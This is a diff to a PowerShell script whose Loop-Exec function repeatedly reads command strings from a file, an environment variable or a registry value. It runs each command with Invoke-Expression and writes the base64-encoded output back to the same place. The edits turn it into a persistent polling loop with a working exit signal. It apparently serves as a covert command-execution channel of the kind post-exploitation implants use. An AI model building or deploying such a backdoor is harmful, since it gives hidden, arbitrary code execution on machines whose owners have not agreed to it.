@@ -14,14 +14,17 @@ function Loop-Exec(){
         [String]
         $exitFlag = "exit"
     )
-    if($ExecType -eq "File"){
-        exec-file -SrcObj $SrcObj -DstObj $DstObj -exitFlag $exitFlag
-    } elseif($ExecType -eq "Env"){
-        exec-env -SrcObj $SrcObj -DstObj $DstObj -exitFlag $exitFlag
-    } elseif($ExecType -eq "Reg"){
-        exec-registry -SrcObj $SrcObj -DstObj $DstObj -exitFlag $exitFlag
+    $global:Flag = $false
+    while(!$global:Flag){
+        if($ExecType -eq "File"){
+            exec-file -SrcObj $SrcObj -DstObj $DstObj -exitFlag $exitFlag
+        } elseif($ExecType -eq "Env"){
+            exec-env -SrcObj $SrcObj -DstObj $DstObj -exitFlag $exitFlag
+        } elseif($ExecType -eq "Reg"){
+            exec-registry -SrcObj $SrcObj -DstObj $DstObj -exitFlag $exitFlag
+        }
+        Sleep $interval
     }
-    if($Global:Flag){ return } else { Sleep $interval }
 }
 
 function exec-file(){
@@ -48,7 +51,6 @@ function exec-file(){
             } else {
                 $res= IEX($com); echo $res > $DstObj
             }
-            $Global:Flag = $false
         }
     }
 }
@@ -71,7 +73,7 @@ function exec-registry(){
         if($com -eq $null){
             return
         } elseif($com -eq $exitFlag){
-            $Global:Flag = $false
+            $Global:Flag = $true
         } else {
             if($isNewProcess){
                 $env:tmpcom = $com
@@ -82,6 +84,7 @@ function exec-registry(){
             } else {
                 $res = IEX($com)
             }
+            $res = Out-String -InputObject $res
             $bytes = [System.Text.Encoding]::Default.GetBytes($res)
             $b64 = [System.Convert]::ToBase64String($bytes)
             Set-ItemProperty -Path $cmdPath -Name $DstObj -Value $b64
@@ -97,12 +100,14 @@ function exec-env(){
         $DstObj,
         [String]
         $exitFlag = "exit",
-        $isNewProcess = $false
+        $isNewProcess = $false,
+        [ValidateSet("Machine", "User", "Process")]
+        $envType = "User"
     )
-    if(Test-Path Env:$SrcObj){
-        $com = [Environment]::GetEnvironmentVariable($SrcObj)
+    $com = [Environment]::GetEnvironmentVariable($SrcObj, $envType)
+    if($com -ne $null){
         if($com -eq $exitFlag){
-            $Global:Flag = $false
+            $Global:Flag = $true
         } else {
             if($isNewProcess){
                 $env:tmpcom = $com
@@ -113,7 +118,10 @@ function exec-env(){
             } else {
                 $res = IEX($com)
             }
-            [Environment]::SetEnvironmentVariable($DstObj, $res)
+            $res = Out-String -InputObject $res
+            $bytes = [System.Text.Encoding]::Default.GetBytes($res)
+            $b64 = [System.Convert]::ToBase64String($bytes)
+            [Environment]::SetEnvironmentVariable($DstObj, $b64, $envType)
         }
     }
 }
